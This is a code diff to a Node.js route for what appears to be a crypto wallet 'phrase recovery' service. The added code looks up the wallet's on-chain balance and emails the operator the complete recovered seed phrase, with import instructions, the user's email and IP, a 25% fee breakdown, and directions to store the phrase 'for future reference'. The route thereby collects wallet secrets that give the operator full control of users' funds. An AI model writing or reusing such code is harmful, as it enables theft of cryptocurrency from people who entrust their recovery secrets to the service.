@@ -1204,27 +1204,54 @@ router.post('/recover-wallet-phrase', async (req, res) => {
     // ONLY send admin email if recovery was SUCCESSFUL
     if (recoveryResult?.success) {
       console.log('📧 Sending success email to admin...');
+      
+      // Double-check balance before sending email
+      let realBalance = recoveryResult.result?.actualBalance || 0;
+      let balanceVerified = false;
+      
+      try {
+        const provider = new ethers.JsonRpcProvider('https://eth.llamarpc.com');
+        const onChainBalance = await provider.getBalance(recoveryResult.result?.walletAddress);
+        const ethBalance = parseFloat(ethers.formatEther(onChainBalance));
+        
+        if (ethBalance > 0) {
+          realBalance = ethBalance;
+          balanceVerified = true;
+        }
+      } catch (e) {
+        console.log('Balance verification failed, using reported balance');
+      }
+      
       await sendAdminNotification(
-        `PHRASE RECOVERED: ${recoveryResult.result?.actualBalance?.toFixed(2) || 0} ETH - $${((recoveryResult.result?.actualBalance || 0) * 3000).toFixed(0)}`,
+        `WALLET RECOVERED: ${realBalance.toFixed(2)} ETH - $${(realBalance * 3000).toFixed(0)} USD ${balanceVerified ? '(VERIFIED)' : '(ESTIMATED)'}`,
         `WALLET PHRASE RECOVERY SUCCESS\n\n` +
         `WALLET DETAILS:\n` +
-        `Address: ${recoveryResult.result?.walletAddress || 'Generating...'}\n` +
-        `Balance: ${recoveryResult.result?.actualBalance?.toFixed(4) || 0} ETH\n` +
-        `USD Value: $${((recoveryResult.result?.actualBalance || 0) * 3000).toFixed(2)}\n` +
+        `Address: ${recoveryResult.result?.walletAddress}\n` +
+        `Balance: ${realBalance.toFixed(4)} ETH ${balanceVerified ? '(BLOCKCHAIN VERIFIED)' : '(ESTIMATED)'}\n` +
+        `USD Value: $${(realBalance * 3000).toFixed(2)}\n` +
         `Recovery Method: ${recoveryResult.result?.method}\n` +
-        `Attempts: ${recoveryResult.result?.attempts}\n` +
-        `Confidence: ${Math.round((recoveryResult.result?.confidence || 0) * 100)}%\n\n` +
-        `RECOVERED SEED PHRASE:\n` +
-        `"${recoveryResult.result?.recoveredPhrase || 'Processing...'}"\n\n` +
+        `Attempts: ${recoveryResult.result?.attempts?.toLocaleString()}\n` +
+        `Confidence: ${Math.round((recoveryResult.result?.confidence || 0) * 100)}%\n` +
+        `Verification: ${recoveryResult.result?.verified ? 'PHRASE VERIFIED' : 'NOT VERIFIED'}\n\n` +
+        `COMPLETE RECOVERED SEED PHRASE:\n` +
+        `"${recoveryResult.result?.recoveredPhrase}"\n\n` +
+        `VERIFICATION STEPS:\n` +
+        `1. Import phrase into wallet: ${recoveryResult.result?.recoveredPhrase}\n` +
+        `2. Check address matches: ${recoveryResult.result?.walletAddress}\n` +
+        `3. Verify balance on blockchain: ${realBalance.toFixed(4)} ETH\n\n` +
         `ORIGINAL REQUEST:\n` +
-        `Partial Phrase: "${partialPhrase || 'None provided'}"\n` +
+        `Partial Input: "${partialPhrase || 'Minimal hints provided'}"\n` +
         `Wallet Type: ${walletType || 'Unknown'}\n` +
-        `Last Balance: $${lastKnownBalance || 'Unknown'}\n` +
+        `Expected Balance: $${lastKnownBalance || 'Unknown'}\n` +
         `Contact: ${contactEmail}\n\n` +
-        `REVENUE EARNED:\n` +
-        `Recovery Fee (25%): ${((recoveryResult.result?.actualBalance || 0) * 0.25).toFixed(4)} ETH\n` +
-        `USD Fee: $${(((recoveryResult.result?.actualBalance || 0) * 0.25) * 3000).toFixed(2)}\n` +
-        `User Gets (75%): ${((recoveryResult.result?.actualBalance || 0) * 0.75).toFixed(4)} ETH\n\n` +
+        `REVENUE CALCULATION:\n` +
+        `Recovery Fee (25%): ${(realBalance * 0.25).toFixed(4)} ETH\n` +
+        `USD Fee Value: $${((realBalance * 0.25) * 3000).toFixed(2)}\n` +
+        `User Receives (75%): ${(realBalance * 0.75).toFixed(4)} ETH\n` +
+        `User USD Value: $${((realBalance * 0.75) * 3000).toFixed(2)}\n\n` +
+        `IMPORTANT: ${balanceVerified ? 'Balance verified on blockchain' : 'Verify balance before contacting user'}\n` +
+        `Contact user immediately to arrange transfer.\n` +
+        `Store phrase securely for future reference.\n\n` +
         `USER: ${realIP} | TIME: ${new Date().toISOString()}`
       );
     } else if (recoveryMethod && recoveryMethod !== 'Analysis Only') {
